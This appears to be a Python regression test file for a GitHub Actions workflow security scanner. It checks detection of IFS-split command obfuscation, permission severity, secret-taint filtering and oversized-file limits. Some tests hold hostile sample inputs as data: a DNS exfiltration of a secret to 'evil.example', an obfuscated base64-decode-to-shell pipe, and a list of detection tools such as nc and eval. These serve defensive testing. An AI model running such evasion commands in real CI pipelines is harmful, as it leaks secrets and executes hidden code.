"""Regression tests for the v0.9 /attack hardening pass (.audit/FINDINGS-workflow-attack-2026-06-06).
Each test pins a fix so the evasion/FP/DoS gap cannot silently return."""

import tempfile
from pathlib import Path

from credence.workflow_audit.scan import scan
from credence.workflow_audit.shellutil import (
    _compact_ifs_tools, _IFS_SPLIT_TOOLS, has_decode_to_shell, outbound_sinks,
)
from credence.workflow_audit.taint import _filter_to_referenced
from credence.workflow_audit.parser import parse_workflow
from credence.workflow_audit.taint import resolve_job
from credence.workflow_audit.rules import RuleContext
import credence.workflow_audit.rules.config_rules as cfg


def _scan_run(run_line, env=None):
    with tempfile.TemporaryDirectory() as d:
        wf = Path(d) / ".github/workflows/c.yml"
        wf.parent.mkdir(parents=True)
        envblock = ""
        if env:
            envblock = "    env:\n" + "".join(f"      {k}: {v}\n" for k, v in env.items())
        wf.write_text("on: push\njobs:\n  b:\n    runs-on: x\n" + envblock +
                      "    steps:\n      - run: " + run_line + "\n")
        return {f["rule_id"] for f in scan(d, history=False)}


# ---- F-001: IFS-split deobfuscation covers the full tool set ----

def test_ifs_split_covers_previously_evading_tools():
    assert _compact_ifs_tools("di g") == "dig"
    assert _compact_ifs_tools("op enssl") == "openssl"
    assert "sh" in _compact_ifs_tools("echo x | base64 -d | s h")
    # all detection tools are present in the derived list
    for tool in ("dig", "openssl", "sh", "gunzip", "nc", "perl", "node", "eval"):
        assert tool in _IFS_SPLIT_TOOLS, tool


def test_ifs_split_dns_exfil_no_longer_evades():
    # di${IFS}g -> normalize -> "di g" -> compact -> "dig" -> DNS sink seen
    ids = _scan_run('di${IFS}g "$T.evil.example"', {"T": "${{ secrets.P }}"})
    assert "WF-EXFIL-001" in ids


def test_ifs_split_openssl_decode_exec_no_longer_evades():
    ids = _scan_run("echo x | op${IFS}enssl enc -d -base64 | sh")
    assert "WF-EXEC-001" in ids


def test_ifs_compaction_excludes_english_prose_host():
    # 'host' is deliberately NOT reassembled to avoid the "ho st" prose FP
    assert _compact_ifs_tools("check if the ho st is up") == "check if the ho st is up"
    assert "host" not in _IFS_SPLIT_TOOLS


# ---- F-005: absent permissions is LOW (noise), explicit broad stays MEDIUM ----

def test_cfg_002_absent_permissions_is_low_not_medium():
    wf = parse_workflow("on: push\njobs:\n  b:\n    runs-on: x\n    steps: []", path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    out = [f for f in cfg.wf_cfg_002(wf, resolved, RuleContext()) if f.rule_id == "WF-CFG-002"]
    assert out and out[0].severity.value == "LOW"


def test_cfg_002_explicit_write_all_stays_medium():
    wf = parse_workflow("on: push\npermissions: write-all\njobs:\n  b:\n    runs-on: x\n    steps: []",
                        path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    out = [f for f in cfg.wf_cfg_002(wf, resolved, RuleContext()) if f.rule_id == "WF-CFG-002"]
    assert out and out[0].severity.value == "MEDIUM"


# ---- taint: _filter_to_referenced is $VAR-anchored, not a bare substring ----

def test_filter_to_referenced_is_anchored():
    # 'CI' is a secret-bound var but only appears as a substring of "SPECIAL", not as $CI
    kept = _filter_to_referenced({"CI": "secrets.X"}, 'echo "this is SPECIAL output"')
    assert kept == {}
    # genuine $CI reference is kept
    assert _filter_to_referenced({"CI": "secrets.X"}, 'echo "$CI"') == {"CI": "secrets.X"}


# ---- F-003: oversized working-tree file is capped, not OOM ----

def test_oversized_workflow_file_emits_size_finding_and_does_not_oom():
    with tempfile.TemporaryDirectory() as d:
        wf = Path(d) / ".github/workflows/big.yml"
        wf.parent.mkdir(parents=True)
        # 3 MB of harmless content (> 2 MB cap)
        wf.write_text("on: push\n# " + ("A" * (3 * 1024 * 1024)) + "\n")
        ids = {f["rule_id"] for f in scan(d, history=False)}
        assert "WF-SIZE-001" in ids
